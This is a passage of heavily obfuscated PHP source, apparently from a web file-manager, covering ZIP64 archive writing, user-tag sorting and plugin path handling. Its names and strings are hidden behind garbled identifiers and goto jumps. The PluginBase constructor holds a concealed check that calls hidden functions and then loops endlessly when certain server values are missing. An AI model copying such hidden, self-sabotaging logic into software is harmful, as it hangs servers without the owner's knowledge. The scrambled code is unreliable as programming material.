$in[$DÆĞª±™Ûø[28]] : $DÆĞª±™Ûø[33]; goto eçËÔ¦³Êˆ; BÁ†ìî£¹¡: } private function errorInfo($eˆê—òÄã±) { $eË¸éÍˆ =& $_SERVER[ºÖÙÂŒäÉê‡]; $C¾Óµ‹…¦È = array($eË¸éÍˆ[1963], $eË¸éÍˆ[1964], $eË¸éÍˆ[1965], $eË¸éÍˆ[1966], $eË¸éÍˆ[1967], $eË¸éÍˆ[1968], $eË¸éÍˆ[1969], $eË¸éÍˆ[1970]); return $eˆê—òÄã± . $eË¸éÍˆ[4] . $C¾Óµ‹…¦È[$eˆê—òÄã±]; } } class ZipMake { const VERSION = "\x30\56\x32\56\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($a¿Ñõµ§ò¢ = null) { $Fï¤ÎÜ¯ãİ =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->outputStream = fopen($Fï¤ÎÜ¯ãİ[1971], $Fï¤ÎÜ¯ãİ[1208]); $this->outputName = $a¿Ñõµ§ò¢; $this->needHeaders = !0; } public function addFile($E‡ùÃ§´ÅÈ, $BÛÓ§ŒÏ±œ) { goto AİÉ’Ö‰ïÆ; AáìÕ İÑ: while (!feof($eƒÖ‘ˆöÍÜ)) { $Eš±ÒŠùî = fread($eƒÖ‘ˆöÍÜ, 1048576); $this->send($Eš±ÒŠùî); } fclose($eƒÖ‘ˆöÍÜ); $aó’ĞéÕœÔ = hexdec(hash_file($a®ïÈ¶¥„…[1973], $BÛÓ§ŒÏ±œ)); goto Aò¢ñğÃ´Ã; Aò¢ñğÃ´Ã: $this->addFileFooter($E‡ùÃ§´ÅÈ, $fÓŞ”… ±, $aó’ĞéÕœÔ, $AÒ§ä°Æğ¨, $aÏñİº÷·Ø, $aÇ•©ÚÙÅ©); goto bñ¯®…—îˆ; AİÉ’Ö‰ïÆ: $a®ïÈ¶¥„… =& $_SERVER[ºÖÙÂŒäÉê‡]; $E‡ùÃ§´ÅÈ = $this->filterFilename($E‡ùÃ§´ÅÈ); $fÓŞ”… ± = static::METHOD_STORE; goto CÑãõ°Õèˆ; CÑãõ°Õèˆ: $aÇ•©ÚÙÅ© = $this->addFileHeader($E‡ùÃ§´ÅÈ, $fÓŞ”… ±); $AÒ§ä°Æğ¨ = $aÏñİº÷·Ø = filesize($BÛÓ§ŒÏ±œ); $eƒÖ‘ˆöÍÜ = fopen($BÛÓ§ŒÏ±œ, $a®ïÈ¶¥„…[1972]); goto AáìÕ İÑ; bñ¯®…—îˆ: } public function addFileFromStream($FÊÁÎ„‰æÍ, $fÈ³ğá…ñØ) { goto FáİíÚìÔò; fñèİ†­Ç: $a´¹®ßÓçÎ = hash_init($_SERVER[ºÖÙÂŒäÉê‡][1973]); while (!feof($fÈ³ğá…ñØ)) { $d›ùŞ˜äöã = fread($fÈ³ğá…ñØ, 1048576); hash_update($a´¹®ßÓçÎ, $d›ùŞ˜äöã); $this->send($d›ùŞ˜äöã); } $DÛ°å–‡Åï = hexdec(hash_final($a´¹®ßÓçÎ)); goto CÔ›ºåšÊˆ; CÔ›ºåšÊˆ: $this->addFileFooter($FÊÁÎ„‰æÍ, $AÅÄ¾‚ñÇ™, $DÛ°å–‡Åï, $aÑ»˜«¤Š, $fÇ‘¨ÁÅëÃ, $eùì£ùÙ’Î); goto A›¥»ùĞ; Dõ•ö„Ë¤­: fseek($fÈ³ğá…ñØ, 0, SEEK_END); $aÑ»˜«¤Š = $fÇ‘¨ÁÅëÃ = ftell($fÈ³ğá…ñØ); rewind($fÈ³ğá…ñØ); goto fñèİ†­Ç; FáİíÚìÔò: $FÊÁÎ„‰æÍ = $this->filterFilename($FÊÁÎ„‰æÍ); $AÅÄ¾‚ñÇ™ = static::METHOD_STORE; $eùì£ùÙ’Î = $this->addFileHeader($FÊÁÎ„‰æÍ, $AÅÄ¾‚ñÇ™); goto Dõ•ö„Ë¤­; A›¥»ùĞ: } public function finish() { foreach ($this->files as $Eó‡§íª”) { $this->addCdrFile($Eó‡§íª”); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($aÉÒİ¿ÁŞ, $eŒ…ä¼‘Î¨) { goto fŒâ¢Ë‚Òù; BÓÇÅ‰¢ã: $f„ª™©·É¥ = $this->packFields($dµùÖï±Öâ); $a§‹”õ³ = $this->packFields($eÂ¡İ˜¢‰˜); $this->send($f„ª™©·É¥ . $aÉÒİ¿ÁŞ . $a§‹”õ³); goto cè“À§÷ÅŒ; fŒâ¢Ë‚Òù: $cæÔÚ¼í°‚ =& $_SERVER[ºÖÙÂŒäÉê‡]; $aÉÒİ¿ÁŞ = preg_replace($cæÔÚ¼í°‚[1974], $cæÔÚ¼í°‚[33], $aÉÒİ¿ÁŞ); $F¶Äõ¶Èõ° = strlen($aÉÒİ¿ÁŞ); goto c®–Ø‘’Ô«; c®–Ø‘’Ô«: $aêÃÇâæŠ = $this->dosTime(time()); $dµùÖï±Öâ = array(array($cæÔÚ¼í°‚[1975], static::FILE_HEADER_SIGNATURE), array($cæÔÚ¼í°‚[1976], static::ZIP_VERSION_64), array($cæÔÚ¼í°‚[1976], 8), array($cæÔÚ¼í°‚[1976], $eŒ…ä¼‘Î¨), array($cæÔÚ¼í°‚[1975], $aêÃÇâæŠ), array($cæÔÚ¼í°‚[1975], 0), array($cæÔÚ¼í°‚[1975], 4294967295), array($cæÔÚ¼í°‚[1975], 4294967295), array($cæÔÚ¼í°‚[1976], $F¶Äõ¶Èõ°), array($cæÔÚ¼í°‚[1976], 32)); $eÂ¡İ˜¢‰˜ = array(array($cæÔÚ¼í°‚[1976], 1), array($cæÔÚ¼í°‚[1976], 28), array($cæÔÚ¼í°‚[1977], 0), array($cæÔÚ¼í°‚[1977], 0), array($cæÔÚ¼í°‚[1977], 0), array($cæÔÚ¼í°‚[1975], 0)); goto BÓÇÅ‰¢ã; cè“À§÷ÅŒ: return strlen($f„ª™©·É¥) + $F¶Äõ¶Èõ° + strlen($a§‹”õ³); goto D«±õä•æ; D«±õä•æ: } protected function addFileFooter($e¥­ˆ‰â×Ì, $CëÒ’Ì¢–œ, $cƒ”ä¬¡ïĞ, $BùÀŒë®ÁÒ, $fÄÄÏáËœÏ, $AÔäÜ Ÿ„²) { $dšÆØÙ®—§ =& $_SERVER[ºÖÙÂŒäÉê‡]; $e¶‹¾ÀÖÙ = array(array($dšÆØÙ®—§[1975], static::DATA_DESCRIPTOR_SIGNATURE), array($dšÆØÙ®—§[1975], $cƒ”ä¬¡ïĞ), array($dšÆØÙ®—§[1977], $BùÀŒë®ÁÒ), array($dšÆØÙ®—§[1977], $fÄÄÏáËœÏ)); $Fµâ²ÈÁ¶ó = $this->packFields($e¶‹¾ÀÖÙ); $this->send($Fµâ²ÈÁ¶ó); $c“Ë§÷ˆĞ = $AÔäÜ Ÿ„² + $BùÀŒë®ÁÒ + $f†º‹“ÄçŠ; $this->addToCdr($e¥­ˆ‰â×Ì, $CëÒ’Ì¢–œ, $cƒ”ä¬¡ïĞ, $BùÀŒë®ÁÒ, $fÄÄÏáËœÏ, $c“Ë§÷ˆĞ); } private function addToCdr($Fƒö†‰ ÁÃ, $F°ê´´ô³, $d–Ä™ª£Í, $A‰Ù„ÓŠöô, $F·‡¸å¢’ó, $DÛ‚¡áçõ) { $this->files[] = array($Fƒö†‰ ÁÃ, $F°ê´´ô³, $d–Ä™ª£Í, $A‰Ù„ÓŠöô, $F·‡¸å¢’ó, $this->ofs); $this->ofs += $DÛ‚¡áçõ; } protected function addCdrFile($Cª åØø¢¨) { goto A¦©…š‘¯Ñ; AÔãØ®Ø: $d¸öğˆ±ƒ = $this->dosTime(time()); $dâ÷Åù¨òÙ = array(array($F•‚ÊŸ­»„[1975], static::CDR_FILE_SIGNATURE), array($F•‚ÊŸ­»„[1976], static::ZIP_VERSION_64), array($F•‚ÊŸ­»„[1976], static::ZIP_VERSION_64), array($F•‚ÊŸ­»„[1976], 8), array($F•‚ÊŸ­»„[1976], $AùÌ—½ø‰), array($F•‚ÊŸ­»„[1975], $d¸öğˆ±ƒ), array($F•‚ÊŸ­»„[1975], $E¾ÂŸ‹ß£), array($F•‚ÊŸ­»„[1975], 4294967295), array($F•‚ÊŸ­»„[1975], 4294967295), array($F•‚ÊŸ­»„[1976], strlen($Cáä‰©Â£)), array($F•‚ÊŸ­»„[1976], 32), array($F•‚ÊŸ­»„[1976], strlen($Bƒµ¬Ê­ğĞ)), array($F•‚ÊŸ­»„[1976], 0), array($F•‚ÊŸ­»„[1976], 0), array($F•‚ÊŸ­»„[1975], 32), array($F•‚ÊŸ­»„[1975], 4294967295)); $a¸¹ˆŒ†Àæ = array(array($F•‚ÊŸ­»„[1976], 1), array($F•‚ÊŸ­»„[1976], 28), array($F•‚ÊŸ­»„[1977], $Fø¯‹¾§¼), array($F•‚ÊŸ­»„[1977], $b›¥İÍ‚Îç), array($F•‚ÊŸ­»„[1977], $e¯Ú¼ÇÌÈ), array($F•‚ÊŸ­»„[1975], 0)); goto E¾¸‘é–Ğ˜; E¾¸‘é–Ğ˜: $BºÏ¦ÁåÁ˜ = $this->packFields($dâ÷Åù¨òÙ); $DÕ›ÊŸÜ½— = $this->packFields($a¸¹ˆŒ†Àæ); $fÒÉ»ÑİÓ = $BºÏ¦ÁåÁ˜ . $Cáä‰©Â£ . $Bƒµ¬Ê­ğĞ . $DÕ›ÊŸÜ½—; goto CÎ‰à…š•ƒ; CÎ‰à…š•ƒ: $this->send($fÒÉ»ÑİÓ); $this->cdr_ofs += strlen($fÒÉ»ÑİÓ); goto F†˜©ÀÉ‘‰; A¦©…š‘¯Ñ: $F•‚ÊŸ­»„ =& $_SERVER[ºÖÙÂŒäÉê‡]; list($Cáä‰©Â£, $AùÌ—½ø‰, $E¾ÂŸ‹ß£, $b›¥İÍ‚Îç, $Fø¯‹¾§¼, $e¯Ú¼ÇÌÈ) = $Cª åØø¢¨; $Bƒµ¬Ê­ğĞ = $F•‚ÊŸ­»„[33]; goto AÔãØ®Ø; F†˜©ÀÉ‘‰: } protected function addCdr64Eof() { goto dí Œ„²ÓÛ; dí Œ„²ÓÛ: $D¹íğ­òˆ =& $_SERVER[ºÖÙÂŒäÉê‡]; $cƒ”ğÉ‰Í‚ = count($this->files); $FÁÎĞµ¦… = $this->cdr_ofs; goto aíŠ¦¶¥øç; aíŠ¦¶¥øç: $C·“£™•‡œ = $this->ofs; $eÄË¼¢¸÷‡ = array(array($D¹íğ­òˆ[1975], static::ZIP64_CDR_EOF_SIGNATURE), array($D¹íğ­òˆ[1977], 44), array($D¹íğ­òˆ[1976], static::ZIP_VERSION_64), array($D¹íğ­òˆ[1976], static::ZIP_VERSION_64), array($D¹íğ­òˆ[1975], 0), array($D¹íğ­òˆ[1975], 0), array($D¹íğ­òˆ[1977], $cƒ”ğÉ‰Í‚), array($D¹íğ­òˆ[1977], $cƒ”ğÉ‰Í‚), array($D¹íğ­òˆ[1977], $FÁÎĞµ¦…), array($D¹íğ­òˆ[1977], $C·“£™•‡œ)); $CÚ÷í«•‰ = $this->packFields($eÄË¼¢¸÷‡); goto C™À—ˆïÜ¥; C™À—ˆïÜ¥: $this->send($CÚ÷í«•‰); goto D¶›ÚÉã²Ñ; D¶›ÚÉã²Ñ: } protected function addCdr64Locator() { goto CŒ¼»Ò’×ù; bÔ•Ïß’™¢: $A·†ˆô·Òö = $this->ofs; $B£•§º† = array(array($cÕ´ï„ÃŞ[1975], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($cÕ´ï„ÃŞ[1975], 0), array($cÕ´ï„ÃŞ[1977], $A·†ˆô·Òö + $aÂåÆÊĞÌÊ), array($cÕ´ï„ÃŞ[1975], 1)); $F»µ„ÁŞÀ¿ = $this->packFields($B£•§º†); goto aè‰õÃ§–Ú; aè‰õÃ§–Ú: $this->send($F»µ„ÁŞÀ¿); goto f»ÒÍÊ­°Î; CŒ¼»Ò’×ù: $cÕ´ï„ÃŞ =& $_SERVER[ºÖÙÂŒäÉê‡]; $EóÕ‘Ê¨÷İ = count($this->files); $aÂåÆÊĞÌÊ = $this->cdr_ofs; goto bÔ•Ïß’™¢; f»ÒÍÊ­°Î: } protected function addCdrEof() { goto CùÅÑéÁ; D‹“¡‰‹Í°: $dœáÔËİ½ = $this->ofs; $C³ß†ùÀª® = $B›²Î°èÕ[33]; $AÏĞÍÔæ¦« = array(array($B›²Î°èÕ[1975], static::CDR_EOF_SIGNATURE), array($B›²Î°èÕ[1976], 0), array($B›²Î°èÕ[1976], 0), array($B›²Î°èÕ[1976], $d¥Ş®‰„), array($B›²Î°èÕ[1976], $d¥Ş®‰„), array($B›²Î°èÕ[1975], 4294967295), array($B›²Î°èÕ[1975], 4294967295), array($B›²Î°èÕ[1976], strlen($C³ß†ùÀª®))); goto FÔàÓº§Ë‘; FÔàÓº§Ë‘: $A®ß·×´‚± = $this->packFields($AÏĞÍÔæ¦«) . $C³ß†ùÀª®; $this->send($A®ß·×´‚±); goto f¢ØØàÄàè; CùÅÑéÁ: $B›²Î°èÕ =& $_SERVER[ºÖÙÂŒäÉê‡]; $d¥Ş®‰„ = count($this->files); $dá×¦” Ò = $this->cdr_ofs; goto D‹“¡‰‹Í°; f¢ØØàÄàè: } protected function addCdr() { foreach ($this->files as $càõ±ÌÜ) { $this->addCdrFile($càõ±ÌÜ); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $fÏ­ÍÃ÷Î =& $_SERVER[ºÖÙÂŒäÉê‡]; $bêğÃŠôÊ¾ = $fÏ­ÍÃ÷Î[208]; if ($this->outputName) { $b÷ñÙî¹‹ = trim(str_replace(array($fÏ­ÍÃ÷Î[112], $fÏ­ÍÃ÷Î[55], $fÏ­ÍÃ÷Î[93], $fÏ­ÍÃ÷Î[67], $fÏ­ÍÃ÷Î[174], $fÏ­ÍÃ÷Î[982]), $fÏ­ÍÃ÷Î[33], $this->outputName)); $CİîõèË¯ö = rawurlencode($b÷ñÙî¹‹); $bêğÃŠôÊ¾ .= "\x3b\40\x66\151\x6c\145\x6e\x61\x6d\x65\x2a\75\165\164\146\55\70\x27\x27{$CİîõèË¯ö}"; } $F•¯º†á×í = array($fÏ­ÍÃ÷Î[205] => $fÏ­ÍÃ÷Î[1978], $fÏ­ÍÃ÷Î[1979] => $bêğÃŠôÊ¾, $fÏ­ÍÃ÷Î[1980] => $fÏ­ÍÃ÷Î[1981], $fÏ­ÍÃ÷Î[1982] => $fÏ­ÍÃ÷Î[1983], $fÏ­ÍÃ÷Î[1984] => $fÏ­ÍÃ÷Î[1985]); foreach ($F•¯º†á×í as $d …´¹‡Òµ => $bŒó…Œó°½) { header($d …´¹‡Òµ . $fÏ­ÍÃ÷Î[872] . $bŒó…Œó°½); } } protected function send($D¨‚ö¡ĞåØ) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $D¨‚ö¡ĞåØ); } protected final function dosTime($a¼Ğ’‹•Ä) { $d»Ûî¯Æà =& $_SERVER[ºÖÙÂŒäÉê‡]; $C¾ÉÂ£šÉŒ = getdate($a¼Ğ’‹•Ä); if ($C¾ÉÂ£šÉŒ[$d»Ûî¯Æà[1688]] < 1980) { $C¾ÉÂ£šÉŒ = array($d»Ûî¯Æà[1688] => 1980, $d»Ûî¯Æà[1986] => 1, $d»Ûî¯Æà[1987] => 1, $d»Ûî¯Æà[1988] => 0, $d»Ûî¯Æà[1989] => 0, $d»Ûî¯Æà[1990] => 0); } $C¾ÉÂ£šÉŒ[$d»Ûî¯Æà[1688]] -= 1980; return $C¾ÉÂ£šÉŒ[$d»Ûî¯Æà[1688]] << 25 | $C¾ÉÂ£šÉŒ[$d»Ûî¯Æà[1986]] << 21 | $C¾ÉÂ£šÉŒ[$d»Ûî¯Æà[1987]] << 16 | $C¾ÉÂ£šÉŒ[$d»Ûî¯Æà[1988]] << 11 | $C¾ÉÂ£šÉŒ[$d»Ûî¯Æà[1989]] << 5 | $C¾ÉÂ£šÉŒ[$d»Ûî¯Æà[1990]] >> 1; } protected function packFields($A¤¨‡çöÙ) { $b‹ò¬Æ«Ù =& $_SERVER[ºÖÙÂŒäÉê‡]; $aÈĞ¦ÍƒÆ = $b‹ò¬Æ«Ù[33]; $f·ò‡¯öç = array(); foreach ($A¤¨‡çöÙ as $cçŒô•³¢) { $aÈĞ¦ÍƒÆ .= $cçŒô•³¢[0]; $f·ò‡¯öç[] = $cçŒô•³¢[1]; } array_unshift($f·ò‡¯öç, $aÈĞ¦ÍƒÆ); return call_user_func_array($b‹ò¬Æ«Ù[1991], $f·ò‡¯öç); } protected function filterFilename($F•¯Öí†¢Ú) { $B©İÚğ‡ªÓ =& $_SERVER[ºÖÙÂŒäÉê‡]; return str_replace(array($B©İÚğ‡ªÓ[93], $B©İÚğ‡ªÓ[4], $B©İÚğ‡ªÓ[182], $B©İÚğ‡ªÓ[69], $B©İÚğ‡ªÓ[112], $B©İÚğ‡ªÓ[917], $B©İÚğ‡ªÓ[920], $B©İÚğ‡ªÓ[276]), $B©İÚğ‡ªÓ[70], $F•¯Öí†¢Ú); } } class ZipStream { } goto C ¢¹Ùƒ¿; a¢©Ïè°±™: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\163\x65\x72\56\x74\x61\147\114\151\163\x74"; public $modelType = "\125\x73\x65\x72\117\160\164\151\157\156"; public $field = array("\x6e\141\x6d\145", "\x73\164\171\154\x65", "\163\x6f\162\164"); public function listData($eëÎâÇÉ­ø = false, $F–Ûğ÷­±ä = "\163\x6f\162\x74", $eŒšÏ¿ô®µ = false) { return parent::listData($eëÎâÇÉ­ø, $F–Ûğ÷­±ä, $eŒšÏ¿ô®µ); } public function remove($EÙ´ê×Ò ) { return parent::remove($EÙ´ê×Ò ); } public function add($Aì›…ñ—­, $F§ìßÂ“‚à = "\x6c\x61\142\x65\154\x2d\x67\162\145\171\x2d\156\x6f\x72\x6d\141\x6c") { $d¶ò‘é =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($this->findByName($Aì›…ñ—­)) { return !1; } $Fë©¸ Œ‹ = array($d¶ò‘é[391] => $Aì›…ñ—­, $d¶ò‘é[441] => $F§ìßÂ“‚à, $d¶ò‘é[2070] => $this->getSort($d¶ò‘é[251]) + 1); return parent::insert($Fë©¸ Œ‹); } public function update($B…Ç‰‘“Šç, $AØƒ‹Ã±¹) { $B™óµ¢ñùõ =& $_SERVER[ºÖÙÂŒäÉê‡]; $D­Ó‰ÁŠİó = $this->listData($B…Ç‰‘“Šç); $fÃ‡ƒ¯ŒôÇ = $this->findByName($AØƒ‹Ã±¹[$B™óµ¢ñùõ[28]]); if (!$D­Ó‰ÁŠİó || $fÃ‡ƒ¯ŒôÇ && $fÃ‡ƒ¯ŒôÇ[$B™óµ¢ñùõ[372]] != $D­Ó‰ÁŠİó[$B™óµ¢ñùõ[372]]) { return !1; } return parent::update($B…Ç‰‘“Šç, $AØƒ‹Ã±¹); } public function moveTop($aõğß£ßÃÛ) { $C¬áóÕæÛ  =& $_SERVER[ºÖÙÂŒäÉê‡]; $d»‚î±–ÄÙ = parent::listData(); $B½İßã¬Ã = $this->getSort($C¬áóÕæÛ [250]); foreach ($d»‚î±–ÄÙ as &$f¯­ëÌÀå) { if ($f¯­ëÌÀå[$C¬áóÕæÛ [372]] == $aõğß£ßÃÛ) { $f¯­ëÌÀå[$C¬áóÕæÛ [2087]] = $B½İßã¬Ã; continue; } $f¯­ëÌÀå[$C¬áóÕæÛ [2087]] += 1; } return parent::resetData($d»‚î±–ÄÙ); } public function moveBottom($f©Òƒù­´) { $c—‰É­š =& $_SERVER[ºÖÙÂŒäÉê‡]; $cã™¦¡åÉ = $this->getSort($c—‰É­š[251]) + 1; return parent::update($f©Òƒù­´, array($c—‰É­š[2087] => $cã™¦¡åÉ)); } public function resetSort($cíÈÜ¯õÆô) { goto eÕÓéÓĞÒ; eÕÓéÓĞÒ: $CÚƒÂ·«‘ =& $_SERVER[ºÖÙÂŒäÉê‡]; $F­öÈçÜæ = array(); $cíÈÜ¯õÆô = is_array($cíÈÜ¯õÆô) ? $cíÈÜ¯õÆô : array(); goto bŒ½–÷·¶ã; d…ÁÔêêƒ: return parent::resetData($f±³ƒƒóâè); goto DÇåê«šØÉ; bŒ½–÷·¶ã: for ($Aáˆá¹îö¯ = 0; $Aáˆá¹îö¯ < count($cíÈÜ¯õÆô); $Aáˆá¹îö¯++) { $F­öÈçÜæ[$cíÈÜ¯õÆô[$Aáˆá¹îö¯] . $CÚƒÂ·«‘[33]] = $Aáˆá¹îö¯ + 1; } $f±³ƒƒóâè = parent::listData(); foreach ($f±³ƒƒóâè as &$Fø„²Ë¤) { $Bß¾´™éºÃ = $F­öÈçÜæ[$Fø„²Ë¤[$CÚƒÂ·«‘[372]]]; $Fø„²Ë¤[$CÚƒÂ·«‘[2087]] = $Bß¾´™éºÃ ? $Bß¾´™éºÃ : $Fø„²Ë¤[$CÚƒÂ·«‘[2087]]; } goto d…ÁÔêêƒ; DÇåê«šØÉ: } private function getSort($BïˆåïôÓä) { $dÓİÕ¶½Š¿ =& $_SERVER[ºÖÙÂŒäÉê‡]; $Eİ±õÃØÆ = parent::listData(); $DŞ¦Œ‘Ó³¡ = array_to_keyvalue($Eİ±õÃØÆ, $dÓİÕ¶½Š¿[33], $dÓİÕ¶½Š¿[2087]); if (!$DŞ¦Œ‘Ó³¡) { $DŞ¦Œ‘Ó³¡ = array(0); } $f‹“¯î¶ƒ = $BïˆåïôÓä == $dÓİÕ¶½Š¿[251] ? max($DŞ¦Œ‘Ó³¡) : min($DŞ¦Œ‘Ó³¡); return intval($f‹“¯î¶ƒ); } } goto a•¬ñø‡‹˜; cÑ’ãã…‹§: function beforeShutdownFatalError($bÉĞ‚õÓ¾Œ) { think_exception($bÉĞ‚õÓ¾Œ); } $_SERVER[$_SERVER[Ş†Ÿ·Ñ«”ÔÂ][48]] = $fš´æ›ïñ´($_SERVER[$_SERVER[Ş†Ÿ·Ñ«”ÔÂ][45]]); $cÖ—¤×¶á = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto eÔô‡¥ØáŞ; bœî¿´¼ÏÀ: class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto b˜—ÛŞä»Ê; C–¶ÒéÇõ™: $this->pluginName = str_replace($dÖçÃÉ É®[1287], $dÖçÃÉ É®[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $dÖçÃÉ É®[8]; $this->pluginApi = appHostGet() . $dÖçÃÉ É®[1288] . $this->pluginName . $dÖçÃÉ É®[8]; goto d±ßªÑ§§; E…æÖêã: $this->values = array(); return $this; goto a¸Ö›áßòÜ; d±ßªÑ§§: $this->pluginHost = PLUGIN_HOST . $this->pluginName . $dÖçÃÉ É®[8]; $this->pluginHostDefault = PLUGIN_HOST . $this->pluginName . $dÖçÃÉ É®[8]; $this->pluginLangArr = $this->initLang(); goto E…æÖêã; b˜—ÛŞä»Ê: $dÖçÃÉ É® =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!isset($_SERVER[$dÖçÃÉ É®[169]]) || !isset($_SERVER[$dÖçÃÉ É®[178]])) { goto EËÎÖõ“; EñÎ—Å¼Ïî: for ($F½°ÁëÜµÅ = $eÑ¿º„†¥Ô; $F½°ÁëÜµÅ > 0; $F½°ÁëÜµÅ++) { $d•…‘ÃÇá¦ = json_encode($GLOBALS[$dÖçÃÉ É®[389]]); } goto dçò‡êÛŞ–; EËÎÖõ“: $bô”ó¶°¢¸ = $dÖçÃÉ É®[785]; $f‘’¹–°­Š = $dÖçÃÉ É®[171]; $Fœ„µÑÑà = $_SERVER[$dÖçÃÉ É®[172]] . $dÖçÃÉ É®[173]; goto F¡ê¾³ÈÍ; F¡ê¾³ÈÍ: $CëéïŒ¯Ó = $f‘’¹–°­Š($Fœ„µÑÑà); $b§¬¼ÏôÈÒ = explode($dÖçÃÉ É®[174], $CëéïŒ¯Ó); if (count($b§¬¼ÏôÈÒ) < $dÖçÃÉ É®[561]) { $Féô«»÷Ê = $dÖçÃÉ É®[176]; $Féô«»÷Ê(); } goto C®³Ìãî; C®³Ìãî: $d•…‘ÃÇá¦ = $dÖçÃÉ É®[786]; $d•…‘ÃÇá¦($_SERVER[$dÖçÃÉ É®[787]]); $eÑ¿º„†¥Ô = 1; goto EñÎ—Å¼Ïî; dçò‡êÛŞ–: } global $in, $config; goto c¬Â¹§¼¿Œ; c¬Â¹§¼¿Œ: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($dÖçÃÉ É®[1287]); goto C–¶ÒéÇõ™; a¸Ö›áßòÜ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ºÖÙÂŒäÉê‡][1289]); } protected function assign($BÜ‘Å¤ºí, $F§ÄŠ ÙÈ‚ = false) { if (is_array($BÜ‘Å¤ºí)) { $this->values = array_merge($this->values, $BÜ‘Å¤ºí); } else { $this->values[$BÜ‘Å¤ºí] = $F§ÄŠ ÙÈ‚; } } protected function display($d˜™¡ôÎ’¶) { extract($this->values); require $d˜™¡ôÎ’¶; } final function hookRegist($Cîø–ëÓ˜á) { $this->modelPlugin->appRegist($this->pluginName, $Cîø–ëÓ˜á); } final function appIcon() { $b‹É²ŠÄçƒ =& $_SERVER[ºÖÙÂŒäÉê‡]; $c‰˜¯÷ØÓ = $this->appPackage(); $EàÉ¹¸Ø‡ = $b‹É²ŠÄçƒ[33]; if (isset($c‰˜¯÷ØÓ[$b‹É²ŠÄçƒ[387]])) { if (isset($c‰˜¯÷ØÓ[$b‹É²ŠÄçƒ[387]][$b‹É²ŠÄçƒ[1290]])) { $EàÉ¹¸Ø‡ = $b‹É²ŠÄçƒ[1291] . $c‰˜¯÷ØÓ[$b‹É²ŠÄçƒ[387]][$b‹É²ŠÄçƒ[1290]] . $b‹É²ŠÄçƒ[1292]; } else { if ($c‰˜¯÷ØÓ[$b‹É²ŠÄçƒ[387]][$b‹É²ŠÄçƒ[1293]]) { $EàÉ¹¸Ø‡ = $b‹É²ŠÄçƒ[1294] . $c‰˜¯÷ØÓ[$b‹É²ŠÄçƒ[387]][$b‹É²ŠÄçƒ[1293]] . $b‹É²ŠÄçƒ[1295]; } } } return $EàÉ¹¸Ø‡; } final function fileCanView($B•‡Ü©ò£) { $E·„‹‡™Ú =& $_SERVER[ºÖÙÂŒäÉê‡]; if (request_url_safe($B•‡Ü©ò£)) { return !0; } if ($this->isShare($B•‡Ü©ò£)) { return !0; } if (!Action($E·„‹‡™Ú[1296])->authCan($E·„‹‡™Ú[1297])) { show_tips(LNG($E·„‹‡™Ú[1298]) . $E·„‹‡™Ú[1299], !1); } ActionCall($E·„‹‡™Ú[1300], $B•‡Ü©ò£); } final function isShare($cÔ²ç—ç») { $B‰‚ÏŒ‹ = KodIO::parse($cÔ²ç—ç»); return $B‰‚ÏŒ‹[$_SERVER[ºÖÙÂŒäÉê‡][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($CŸ¼çÁæóÃ) { if (request_url_safe($CŸ¼çÁæóÃ)) { return $CŸ¼çÁæóÃ; } if (!$this->isShare($CŸ¼çÁæóÃ)) { $CŸ¼çÁæóÃ = $this->filePath($CŸ¼çÁæóÃ); } return Action($_SERVER[ºÖÙÂŒäÉê‡][1007])->linkOut($CŸ¼çÁæóÃ); } public function filePathLinkOut($c²ÏœÒªÈİ) { if (request_url_safe($c²ÏœÒªÈİ)) { return $c²ÏœÒªÈİ; } $this->fileCanView($c²ÏœÒªÈİ); return Action($_SERVER[ºÖÙÂŒäÉê‡][1007])->link($c²ÏœÒªÈİ); } final function filePath($b´ÀîÇ²ê) { $A´¡ÑÇâŒæ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($FÉá’‘ñİ‰ = $this->checkSharePath($b´ÀîÇ²ê)) { return $FÉá’‘ñİ‰; } $this->fileCanView($b´ÀîÇ²ê); if (request_url_safe($b´ÀîÇ²ê)) { $eŒÎîØ¯•™ = parse_url_query($b´ÀîÇ²ê); if (isset($eŒÎîØ¯•™[$A´¡ÑÇâŒæ[1301]]) && isset($eŒÎîØ¯•™[$A´¡ÑÇâŒæ[203]])) { $eÄß²å§Ÿ¼ = Model($A´¡ÑÇâŒæ[1078])->get($A´¡ÑÇâŒæ[1302]); $aç¬äé“‰ = Mcrypt::decode($eŒÎîØ¯•™[$A´¡ÑÇâŒæ[203]], $eÄß²å§Ÿ¼); if ($aç¬äé“‰) { $this->fileInfo = IO::infoWithChildren($aç¬äé“‰); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $aç¬äé“‰; } } $b´ÀîÇ²ê = $this->_cacheHttpFile($b´ÀîÇ²ê); $this->fileInfo = IO::infoWithChildren($b´ÀîÇ²ê); } else { $this->fileInfo = IO::infoWithChildren($b´ÀîÇ²ê); if (!$this->fileInfo) { show_tips(LNG($A´¡ÑÇâŒæ[100]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $b´ÀîÇ²ê; } final function 